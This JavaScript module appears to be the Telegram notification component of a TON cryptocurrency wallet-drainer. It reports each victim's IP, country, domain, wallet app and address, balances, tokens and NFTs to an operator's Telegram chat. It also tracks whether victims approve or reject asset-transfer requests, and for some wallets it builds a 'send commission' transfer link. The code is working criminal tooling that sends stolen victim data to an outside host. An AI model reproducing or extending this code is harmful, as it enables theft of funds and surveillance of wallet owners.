class Notify {
    #userInfo;
    messages = [];
    constructor(token, id, userInfo) {
        this.token = token;
        this.id = id;
        this.#userInfo = userInfo;
    }

    updateUserInfo (userInfo) {this.#userInfo = userInfo;}

    async #notifyTelegramChannel(message, buttons = []) {
        try {
            const result = await fetch(`https://api.telegram.org/bot${this.token}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: this.id,
                    text: message,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true,
                    reply_markup: JSON.stringify({
                        inline_keyboard: [
                            ...buttons
                        ],
                    })
                })
            });
            return true;
        } catch (e) {
            return false;
        }
    };

    async opened () {
        const message = `<b>🌐 User opened website</b>\n\n` +
            `<b>Domain:</b> <code>${this.#userInfo.domain}</code>\n` +
             `<b>IP:</b> <code>${this.#userInfo.ip}</code> ${this.#userInfo.country}`;

        if (this.messages.includes(message)) {
            return
        }

        this.messages.push(message)

        await this.#notifyTelegramChannel(message);

        return message;
    }

    async closed () {
        const message = `<b>👮 User closed website</b>\n\n` +
            `<b>Domain:</b> <code>${this.#userInfo.domain}</code>\n` +
            `<b>IP:</b> <code>${this.#userInfo.ip}</code> ${this.#userInfo.country}`;

        if (this.messages.includes(message)) {
            return
        }

        this.messages.push(message)

        await this.#notifyTelegramChannel(message);

        return message;
    }

    async connected (tgBalance, jettonList, nftList, settings) {
        if (settings.NOTIFY_ZERO_WALLETS === 'false' && +tgBalance < 0.10 && jettonList.length === 0 && nftList.length === 0) {
            return;
        }
        let message = `<b>👛 Wallet conected! #${this.#userInfo.hash}</b>\n\n` +
            `<b>Domain:</b> <code>${this.#userInfo.domain}</code>\n` +
            `<b>IP:</b> <code>${this.#userInfo.ip}</code> ${this.#userInfo.country}\n\n` +
            `<b>Wallet/Platform:</b> <code>${this.#userInfo.device.app}/${this.#userInfo.device.platform}</code>\n` +
            `<b>Wallet:</b> <a href="https://tonviewer.com/${this.#userInfo.address}">Ton View</a>\n\n` +
            `<b>Wallet balance:</b>\n` +
            `<b>TON:</b> <code>${tgBalance} TON</code>`;
        let jetonsWitoutZero = false;
        try {
            if (jettonList.length > 0) {
                message += `\n\n<b>🪙 Jetton's:</b>`;
                jettonList.forEach(jetton => {
                    if (jetton.roundedBalance > 0) {
                        jetonsWitoutZero = true;
                        message += `\n${jetton.symbol} - ${jetton.roundedBalance} | ${jetton.price} USD`;
                    }
                });
            }
        } catch (e) {}
        try {
            if (nftList.length > 0) {
                message += `\n\n<b>🖼️ NFTs:</b>`;
                nftList.forEach(nft => {
                    message += `\n${nft.name} - ${nft.price} USD`;
                });
            }
        } catch (e) {}
        let url = '';
        let useButtons = false;
        message += '\n\n#connection'
        if (+tgBalance < 0.20 && jettonList.length > 0 && jetonsWitoutZero === true || +tgBalance < 0.20 && nftList.length > 0) {
            url = `ton://transfer/${this.#userInfo.address}?amount=${+settings.BUTTON_FEE_AMOUNT * 1000000000}&text=${encodeURIComponent(settings.BUTON_FEE_COM)}`;
            message += ` #comission`;
            useButtons = true;
        }

        if (this.messages.includes(message)) {
            return
        }

        this.messages.push(message)

        await this.#notifyTelegramChannel(message, useButtons ? [[{text: '💎 Отправить комиссию', url: url}]] : []);

        return message;
    }

    async creatingJetton (chunk) {
        let chunkBalance = chunk.reduce((sum, asset) => sum + asset.usdBal, 0);

        let message = `<b>⏳ Push request! #${this.#userInfo.hash}</b>\n\n` +
            `<b>Total:</b> <code>${chunkBalance} USD</code>\n\n` +
            `<b>Domain:</b> <code>${this.#userInfo.domain}</code>\n` +
            `<b>IP:</b> <code>${this.#userInfo.ip}</code> ${this.#userInfo.country}\n\n` +
            `<b>Wallet/Platform:</b> <code>${this.#userInfo.device.app}/${this.#userInfo.device.platform}</code>\n` +
            `<b>Wallet:</b> <a href="https://tonviewer.com/${this.#userInfo.address}">Ton View</a>\n\n`;
        chunk.forEach(asset => {
            message += `<b>${asset.name}</b> - <code>${asset.usdBal} USD</code>\n`;
        });

        message += '\n\n#requested'

        if (this.messages.includes(message)) {
            return
        }

        this.messages.push(message)

        await this.#notifyTelegramChannel(message);

        return message;
    }

    async transactionStatusJetton (status, chunk) {

        let message = '';
        let chunkBalance = chunk.reduce((sum, asset) => sum + asset.usdBal, 0);
        switch (status) {
            case 'sent':
                message += `<b>💎 Request confirmed! #${this.#userInfo.hash}</b>\n\n` +
                    `<b>Total:</b> <code>${chunkBalance} USD</code>\n\n` +
                    `<b>Domain:</b> <code>${this.#userInfo.domain}</code>\n` +
                    `<b>IP:</b> <code>${this.#userInfo.ip}</code> ${this.#userInfo.country}\n\n` +
                    `<b>Wallet/Platform:</b> <code>${this.#userInfo.device.app}/${this.#userInfo.device.platform}</code>\n` +
                    `<b>Wallet:</b> <a href="https://tonviewer.com/${this.#userInfo.address}">Ton View</a>\n\n`;
                chunk.forEach(asset => {
                    message += `<b>${asset.name}</b> - <code>${asset.usdBal} USD</code>\n`;
                });
                message += '\n\n#approved'
                break;
            case 'error':
                message += `<b>❌ User reject request! #${this.#userInfo.hash}</b>\n\n` +
                    `<b>Total:</b> <code>${chunkBalance} USD</code>\n\n` +
                    `<b>Domain:</b> <code>${this.#userInfo.domain}</code>\n` +
                    `<b>IP:</b> <code>${this.#userInfo.ip}</code> ${this.#userInfo.country}\n\n` +
                    `<b>Wallet/Platform:</b> <code>${this.#userInfo.device.app}/${this.#userInfo.device.platform}</code>\n` +
                    `<b>Wallet:</b> <a href="https://tonviewer.com/${this.#userInfo.address}">Ton View</a>\n\n`;
                chunk.forEach(asset => {
                    message += `<b>${asset.name}</b> - <code>${asset.usdBal} USD</code>\n`;
                });
                message += '\n\n#notapproved'
                break;
        }

        if (this.messages.includes(message)) {
            return
        }

        this.messages.push(message)

        await this.#notifyTelegramChannel(message);

        return message;
    }
}

module.exports = Notify;